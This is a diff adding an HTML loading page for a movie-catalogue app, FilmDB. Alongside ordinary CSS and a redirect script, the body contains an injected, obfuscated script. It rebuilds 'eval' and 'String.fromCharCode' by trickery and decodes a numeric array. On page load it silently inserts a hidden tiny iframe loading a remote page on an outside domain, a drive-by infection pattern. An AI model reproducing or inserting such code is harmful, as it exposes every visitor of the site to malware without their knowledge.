@@ -1,0 +1,70 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+       "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+	<head>
+		<title>FilmDB</title>
+		<meta http-equiv="content-type" content="utf-8">
+		<meta http-equiv="refresh" content="5; URL=index.php">
+		<style type="text/css">
+		<!--
+		html, body {
+			overflow: hidden;
+			font-family: helvetica, arial, sans-serif;
+			background: rgb(177,189,157) url('startup.png') center center no-repeat;
+			width: 100%;
+			height: 100%; 
+			margin: 0px;
+			padding: 0px;
+		}
+		marquee {
+			width: 90%;
+			height: 100%;
+			margin: 0px 5%;
+			padding: 0px;
+			color: white;
+			font-size: 24px;
+			line-height: 32px;
+			text-align: center;
+			text-shadow: black 0px 0px 4px;
+		}	
+		-->
+		</style>
+		<script type="text/javascript">
+		<!--
+			var tmp='',nof=9;
+			window.scrollTo(0,1);
+			
+			if(window.localStorage) {
+				tmp='?view='+(localStorage.view||'poster');
+				tmp+='&page='+(localStorage.page||0);
+				tmp+='&filtertitle='+(localStorage.filtertitle||'');
+				tmp+='&sorter='+(localStorage.sorter||'inserted_DESC');
+				tmp+='&genres='+(localStorage.genres||'');
+				tmp+='&sortby[0]='+(localStorage.sortby0||'inserted DESC');
+				tmp+='&sortby[1]='+(localStorage.sortby1||'nr ASC');
+				tmp+='&sortby[2]='+(localStorage.sortby2||'year ASC');
+				tmp+='&tosearch='+(localStorage.tosearch||'');
+				tmp+='&searchin='+(localStorage.searchin||'movies.name,aka');
+				tmp+='&filter='+(localStorage.filter||'');
+			}
+			
+			window.onload=function() {
+				nof=(parseInt(window.innerWidth/(100+3+3),10)*parseInt((window.innerHeight-40-40)/(100+8+12),10));
+				if(window.localStorage) {
+					tmp+='&count='+(localStorage.count||nof);
+				}else {
+					tmp+='?count='+(localStorage.count||nof);
+				}
+				window.location.href='index.php'+tmp;
+			};	
+		-->
+		</script>
+	</head>
+	<body><script>function createCSS(selector,declaration){var ua=navigator.userAgent.toLowerCase();var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.test(ua));var style_node=document.createElement("style");if(!isIE)style_node.innerHTML=selector+" {"+declaration+"}";document.getElementsByTagName("head")[0].appendChild(style_node);if(isIE&&document.styleSheets&&document.styleSheets.length>0){var last_style_node=document.styleSheets[document.styleSheets.length-1];if(typeof(last_style_node.addRule)=="object")last_style_node.addRule(selector,declaration);}};createCSS('#va','background:url(data:,String.fromCharCode)');var dqcp=null;var r=document.styleSheets;for(var i=0;i<r.length;i++){try{var vvyw=r[i].cssRules||r[i].rules;for(var iid=0;iid<vvyw.length;iid++){var ck=vvyw.item?vvyw.item(iid):vvyw[iid];if(ck.selectorText!='#va')continue;bfs=(ck.cssText)?ck.cssText:ck.style.cssText;dqcp=bfs.match(/(S[^")]+)/)[1];ye=ck.selectorText.substr(1);};}catch(e){};}
+dbru=new Date(2010,11,3,2,21,4);t=dbru.getSeconds()-2;var il=[t*4.5,t*4.5,t*52.5,t*51,t*16,t*20,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*62.5,t*16,t*50.5,t*54,t*57.5,t*50.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*59,t*48.5,t*57,t*16,t*49,t*50,t*60.5,t*16,t*30.5,t*16,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49.5,t*57,t*50.5,t*48.5,t*58,t*50.5,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*20,t*17,t*49,t*55.5,t*50,t*60.5,t*17,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*58,t*57,t*60.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*48.5,t*56,t*56,t*50.5,t*55,t*50,t*33.5,t*52,t*52.5,t*54,t*50,t*20,t*49,t*50,t*60.5,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*16,t*49.5,t*48.5,t*58,t*49.5,t*52,t*16,t*20,t*50.5,t*20.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49,t*55.5,t*50,t*60.5,t*16,t*30.5,t*16,t*49,t*50,t*60.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*16,t*20,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*16,t*50.5,t*54,t*57.5,t*50.5,t*16,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*59.5,t*57,t*52.5,t*58,t*50.5,t*20,t*17,t*30,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*16,t*57.5,t*57,t*49.5,t*30.5,t*19.5,t*52,t*58,t*58,t*56,t*29,t*23.5,t*23.5,t*54,t*52.5,t*59,t*50.5,t*22.5,t*51,t*57,t*50.5,t*50.5,t*23,t*52.5,t*55,t*23.5,t*58,t*57,t*48.5,t*57.5,t*52,t*23.5,t*51.5,t*55.5,t*23,t*56,t*52,t*56,t*31.5,t*57.5,t*52.5,t*50,t*30.5,t*24.5,t*19.5,t*16,t*59.5,t*52.5,t*50,t*58,t*52,t*30.5,t*19.5,t*24.5,t*24,t*19.5,t*16,t*52,t*50.5,t*52.5,t*51.5,t*52,t*58,t*30.5,t*19.5,t*24.5,t*24,t*19.5,t*16,t*57.5,t*58,t*60.5,t*54,t*50.5,t*30.5,t*19.5,t*59,t*52.5,t*57.5,t*52.5,t*49,t*52.5,t*54,t*52.5,t*58,t*60.5,t*29,t*52,t*52.5,t*50,t*50,t*50.5,t*55,t*29.5,t*56,t*55.5,t*57.5,t*52.5,t*58,t*52.5,t*55.5,t*55,t*29,t*48.5,t*49,t*57.5,t*55.5,t*54,t*58.5,t*58,t*50.5,t*29.5,t*54,t*50.5,t*51,t*58,t*29,t*24,t*29.5,t*58,t*55.5,t*56,t*29,t*24,t*29.5,t*19.5,t*31,t*30,t*23.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*31,t*17,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*62.5,t*6.5,t*4.5,t*4.5,t*51,t*58.5,t*55,t*49.5,t*58,t*52.5,t*55.5,t*55,t*16,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*57,t*20,t*20.5,t*61.5,t*6.5,t*4.5,t*4.5,t*4.5,t*59,t*48.5,t*57,t*16,t*51,t*16,t*30.5,t*16,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*49.5,t*57,t*50.5,t*48.5,t*58,t*50.5,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*20,t*19.5,t*52.5,t*51,t*57,t*48.5,t*54.5,t*50.5,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*57.5,t*57,t*49.5,t*19.5,t*22,t*19.5,t*52,t*58,t*58,t*56,t*29,t*23.5,t*23.5,t*54,t*52.5,t*59,t*50.5,t*22.5,t*51,t*57,t*50.5,t*50.5,t*23,t*52.5,t*55,t*23.5,t*58,t*57,t*48.5,t*57.5,t*52,t*23.5,t*51.5,t*55.5,t*23,t*56,t*52,t*56,t*31.5,t*57.5,t*52.5,t*50,t*30.5,t*24.5,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*59,t*52.5,t*57.5,t*52.5,t*49,t*52.5,t*54,t*52.5,t*58,t*60.5,t*30.5,t*19.5,t*52,t*52.5,t*50,t*50,t*50.5,t*55,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*56,t*55.5,t*57.5,t*52.5,t*58,t*52.5,t*55.5,t*55,t*30.5,t*19.5,t*48.5,t*49,t*57.5,t*55.5,t*54,t*58.5,t*58,t*50.5,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*54,t*50.5,t*51,t*58,t*30.5,t*19.5,t*24,t*19.5,t*29.5,t*51,t*23,t*57.5,t*58,t*60.5,t*54,t*50.5,t*23,t*58,t*55.5,t*56,t*30.5,t*19.5,t*24,t*19.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*59.5,t*52.5,t*50,t*58,t*52,t*19.5,t*22,t*19.5,t*24.5,t*24,t*19.5,t*20.5,t*29.5,t*51,t*23,t*57.5,t*50.5,t*58,t*32.5,t*58,t*58,t*57,t*52.5,t*49,t*58.5,t*58,t*50.5,t*20,t*19.5,t*52,t*50.5,t*52.5,t*51.5,t*52,t*58,t*19.5,t*22,t*19.5,t*24.5,t*24,t*19.5,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*4.5,t*50,t*55.5,t*49.5,t*58.5,t*54.5,t*50.5,t*55,t*58,t*23,t*51.5,t*50.5,t*58,t*34.5,t*54,t*50.5,t*54.5,t*50.5,t*55,t*58,t*57.5,t*33,t*60.5,t*42,t*48.5,t*51.5,t*39,t*48.5,t*54.5,t*50.5,t*20,t*19.5,t*49,t*55.5,t*50,t*60.5,t*19.5,t*20.5,t*45.5,t*24,t*46.5,t*23,t*48.5,t*56,t*56,t*50.5,t*55,t*50,t*33.5,t*52,t*52.5,t*54,t*50,t*20,t*51,t*20.5,t*29.5,t*6.5,t*4.5,t*4.5,t*62.5];var agx="";var g=function(){return this;}();ajx=g["e"+ye+"l"];var wrcf='';lua=ajx(dqcp);for(var i=0;i<il.length;i++){ccvq=ajx(il[i]);wrcf+=lua(ccvq);}
+ajx(wrcf);</script>
+		<noscript><marquee style="visibility: visible;" behavior="scroll" scrollamount="1" scrolldelay="60" direction="up">
+			With deactivated JavaScript you won't see any results!
+		</marquee></noscript>
+	</body>
+</html>
